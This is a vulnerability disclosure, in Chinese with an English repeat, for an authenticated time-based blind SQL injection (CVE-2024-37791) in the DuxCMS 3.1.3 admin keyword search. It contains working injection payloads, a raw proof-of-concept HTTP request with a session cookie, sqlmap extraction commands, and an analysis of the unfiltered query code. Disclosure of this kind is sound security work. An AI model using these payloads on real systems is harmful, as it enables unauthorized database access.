# CVE-2024-37791

## CVE-2024-37791

项目地址：****

准备工作：

登入后台-获取cookie

### 漏洞URL:

[http://127.0.0.1:8093/s/article/Content/index?class_id=&keyword=](http://127.0.0.1:8093/s/article/Content/index?class_id=&keyword=%27and(select*from(select+if(ascii(substr(database(),1,1))%3E97,sleep(1),0))a/**/union/**/select+1)=%27)

漏洞参数: keyword

payload: [%27and(select*from(select+if(ascii(substr(database(),1,1))%3E97,sleep(1),0))a/**/union/**/select+1)=%27](http://127.0.0.1:8093/s/article/Content/index?class_id=&keyword=%27and(select*from(select+if(ascii(substr(database(),1,1))%3E97,sleep(1),0))a/**/union/**/select+1)=%27)

注入成功则延迟大于一秒,否则没有延迟

![](./imgs/1.png)

sqlmap验证：

### poc

需要有cookie。

```bash
GET http://127.0.0.1:8093/s/article/Content/index?class_id=&keyword=%27and%28select%2Afrom%28select%2Bsleep%283%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27 HTTP/1.1

Host: 127.0.0.1:8093

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Cookie: PHPSESSID=jna2rl0d9ie3em6gb82s9odb3j

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Priority: u=1
```

#### python2 sqlmap.py -r 1.txt -p keyword -technique=T --tamper=space2comment

![](./imgs/2.png)

#### python2 sqlmap.py -r 1.txt -p keyword -technique=T --tamper=space2comment --current-db

![](./imgs/3.png)

成功获取到当前的使用的数据库名称。存在此漏洞。

## 漏洞代码：

从注入参数: keyword 进行检索能定位到调用位置。

app/system/admin/SystemExtendAdmin.php

第：42行。

![](./imgs/4.png)

使用 like 进行模糊匹配且没有对$value过滤所以带入查询中出现了漏洞。

当输入：and(select*from(select sleep(3))a/**/union/**/select 1)=

![](./imgs/5.png)

如上图所示：$value 参数从第29行 $pageParams = request();   request请求中获取，然后第32行对$pageParams[$key] 进行 urldecode()解码得到我们的恶意sql语句。没有防御措施.

因此直接拼接了payload

![](./imgs/6.png)

执行后，完整的sql语句为：

(A.title like '%and(select*from(select sleep(3))a/**/union/**/select 1)=%')

---

## Sql injection exists in DuxCMS3.1.3 background (time blind injection)

Preparatory work:

Log in to the backend-get cookie.

#### Vulnerability URL:

[http://127.0.0.1:8093/s/article/Content/index?class_id=&keyword=](http://127.0.0.1:8093/s/article/Content/index?class_id=&keyword=%27and(select*from(select+if(ascii(substr(database(),1,1))%3E97,sleep(1),0))a/**/union/**/select+1)=%27)

Vulnerability parameter: keyword

payload: [%27and(select*from(select+if(ascii(substr(database(),1,1))%3E97,sleep(1),0))a/**/union/**/select+1)=%27](http://127.0.0.1:8093/s/article/Content/index?class_id=&keyword=%27and(select*from(select+if(ascii(substr(database(),1,1))%3E97,sleep(1),0))a/**/union/**/select+1)=%27)

If the injection is successful, the delay is more than one second, otherwise there is no delay.

![](./imgs/1.png)

Sqlmap authentication:

#### Poc.

Cookie is required.

```bash
GET http://127.0.0.1:8093/s/article/Content/index?class_id=&keyword=%27and%28select%2Afrom%28select%2Bsleep%283%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27 HTTP/1.1

Host: 127.0.0.1:8093

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Cookie: PHPSESSID=jna2rl0d9ie3em6gb82s9odb3j

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Priority: u=1
```

#### python2 sqlmap.py -r 1.txt -p keyword -technique=T --tamper=space2comment

![](./imgs/2.png)

#### python2 sqlmap.py -r 1.txt -p keyword -technique=T --tamper=space2comment --current-db

![](./imgs/3.png)

The name of the currently used database was successfully obtained.

This vulnerability exists.

### Vulnerability code:

Retrieving from the injection parameter: keyword can locate the call location.

App/system/admin/SystemExtendAdmin.php.

Line 42.

![](./imgs/4.png)

There is a vulnerability in the query because it uses like for fuzzy matching and does not filter $value.

When entering: and (select*from (select sleep (3)) a/**/union/**/select 1) =

![](./imgs/5.png)

As shown in the figure above: the $value parameter is obtained from line 29$ pageParams = request (); request request, and then line 32 decodes $pageParams [$key] with urldecode () to get our malicious sql statement.

There are no defenses.

So the payload is spliced directly.

![](./imgs/6.png)

After execution, the complete sql statement is:

(A.title like'% and (select*from (select sleep (3)) a/**/union/**/select 1) =%')
